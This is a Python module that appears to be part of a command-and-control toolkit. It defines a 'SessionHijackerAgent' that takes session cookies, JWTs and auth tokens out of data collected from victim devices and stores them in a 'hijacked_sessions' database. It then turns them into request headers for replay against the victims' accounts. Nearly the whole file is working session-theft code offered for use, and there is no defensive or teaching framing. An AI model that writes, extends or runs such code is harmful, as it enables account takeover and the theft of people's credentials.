import os
import json
import base64
import logging
import sqlite3
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List

logger = logging.getLogger(__name__)

try:
    from crypto_utils import encrypt_data, decrypt_data
except ImportError:
    logger.warning("crypto_utils not found, using base64 encoding fallback (INSECURE)")
    def encrypt_data(data: bytes) -> bytes: return base64.b64encode(data)
    def decrypt_data(data: bytes) -> bytes: return base64.b64decode(data)

DB_PATH = os.environ.get("C2_DB_PATH", "/data/c2/sessions.db")
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS hijacked_sessions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT NOT NULL,
                  session_type TEXT NOT NULL,
                  raw_data TEXT NOT NULL,
                  extracted_token TEXT,
                  domain TEXT,
                  captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  last_used TIMESTAMP,
                  status TEXT DEFAULT 'active')''')
    conn.commit()
    conn.close()

init_db()

class SessionHijackerAgent:
    def __init__(self):
        self.captured_sessions = {}
        self._load_sessions()

    def _load_sessions(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT device_id, session_type, raw_data, extracted_token, domain FROM hijacked_sessions WHERE status='active'")
        rows = c.fetchall()
        for row in rows:
            device_id, stype, raw, token, domain = row
            if device_id not in self.captured_sessions:
                self.captured_sessions[device_id] = []
            self.captured_sessions[device_id].append({
                "type": stype,
                "raw": raw,
                "token": token,
                "domain": domain,
                "source": "database"
            })
        conn.close()
        logger.info(f"Loaded {sum(len(v) for v in self.captured_sessions.values())} sessions from DB")

    def analyze_data(self, device_id: str, data_payload: Dict[str, Any]) -> List[Dict]:
        discovered = []
        data_str = json.dumps(data_payload)
        potential = []

        # Detect cookies in various formats
        if "cookie" in data_str.lower() or "session" in data_str.lower():
            # Simple extraction (in real scenario, use regex or parsing)
            import re
            cookie_pattern = r'(session[_\s]?id|auth[_\s]?token|token|jwt|access[_\s]?token)[=:]["\']?([a-zA-Z0-9\-_\.]+)'
            for match in re.finditer(cookie_pattern, data_str, re.IGNORECASE):
                potential.append({"type": "token", "key": match.group(1), "value": match.group(2)})

        # If JSON, extract known fields
        if isinstance(data_payload, dict):
            for key in ["sessionid", "session_id", "token", "jwt", "auth", "authorization"]:
                if key in data_payload:
                    val = data_payload[key]
                    if val and len(str(val)) > 5:
                        potential.append({"type": "json_field", "key": key, "value": val})

        for p in potential:
            token_val = str(p["value"])
            # Encrypt raw data before storing
            raw_enc = encrypt_data(json.dumps(p).encode()).decode()
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('''INSERT INTO hijacked_sessions
                         (device_id, session_type, raw_data, extracted_token, domain)
                         VALUES (?, ?, ?, ?, ?)''',
                      (device_id, p["type"], raw_enc, token_val, data_payload.get("domain", "")))
            conn.commit()
            session_id = c.lastrowid
            conn.close()
            discovered.append({**p, "id": session_id})

            if device_id not in self.captured_sessions:
                self.captured_sessions[device_id] = []
            self.captured_sessions[device_id].append({**p, "source": "live"})

        if discovered:
            logger.info(f"Captured {len(discovered)} session tokens from device {device_id}")
        return discovered

    def get_sessions_for_device(self, device_id: str) -> List[Dict]:
        return self.captured_sessions.get(device_id, [])

    def hijack_session(self, session_id: int, target_url: str = None) -> Optional[Dict]:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT device_id, session_type, extracted_token, domain FROM hijacked_sessions WHERE id=?", (session_id,))
        row = c.fetchone()
        if not row:
            conn.close()
            return None
        device_id, stype, token, domain = row
        # Update last used
        c.execute("UPDATE hijacked_sessions SET last_used=CURRENT_TIMESTAMP WHERE id=?", (session_id,))
        conn.commit()
        conn.close()

        logger.info(f"Hijacking session {session_id} (token: {token[:10]}...) for device {device_id}")
        # Return token info to be used by other modules
        return {
            "session_id": session_id,
            "device_id": device_id,
            "token": token,
            "domain": domain or target_url,
            "type": stype,
            "usable": True
        }

    def format_for_request(self, session_data: Dict) -> Dict:
        """Convert captured session to headers for requests"""
        token = session_data["token"]
        if session_data["type"] in ["jwt", "token"]:
            return {"Authorization": f"Bearer {token}"}
        elif session_data["type"] in ["sessionid", "session_id"]:
            return {"Cookie": f"sessionid={token}"}
        else:
            # generic: assume cookie
            return {"Cookie": token}

    def invalidate_session(self, session_id: int):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE hijacked_sessions SET status='invalid' WHERE id=?", (session_id,))
        conn.commit()
        conn.close()
        # Also remove from cache
        for dev, sessions in list(self.captured_sessions.items()):
            self.captured_sessions[dev] = [s for s in sessions if s.get("id") != session_id]

    def process_task(self, task_type: str, data: Any) -> Dict:
        if task_type == "analyze":
            device_id = data.get("device_id")
            payload = data.get("payload", {})
            if not device_id:
                return {"error": "Missing device_id"}
            discovered = self.analyze_data(device_id, payload)
            return {"discovered": discovered}
        elif task_type == "list":
            device_id = data.get("device_id")
            if not device_id:
                return {"error": "Missing device_id"}
            return {"sessions": self.get_sessions_for_device(device_id)}
        elif task_type == "hijack":
            session_id = data.get("session_id")
            target = data.get("target_url")
            if not session_id:
                return {"error": "Missing session_id"}
            res = self.hijack_session(session_id, target)
            if res:
                headers = self.format_for_request(res)
                return {"success": True, "headers": headers, "token": res["token"]}
            return {"error": "Session not found"}
        elif task_type == "invalidate":
            session_id = data.get("session_id")
            if not session_id:
                return {"error": "Missing session_id"}
            self.invalidate_session(session_id)
            return {"status": "invalidated"}
        return {"error": f"Unknown task type {task_type}"}

if __name__ == '__main__':
    agent = SessionHijackerAgent()
    test_data = {"domain": "example.com", "cookie": "session_id=abc123def; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"}
    res = agent.analyze_data("test_device", test_data)
    print("Analysis result:", res)
    if res:
        sid = res[0].get("id")
        if sid:
            hijack = agent.hijack_session(sid, "https://example.com/api")
            print("Hijack result:", hijack)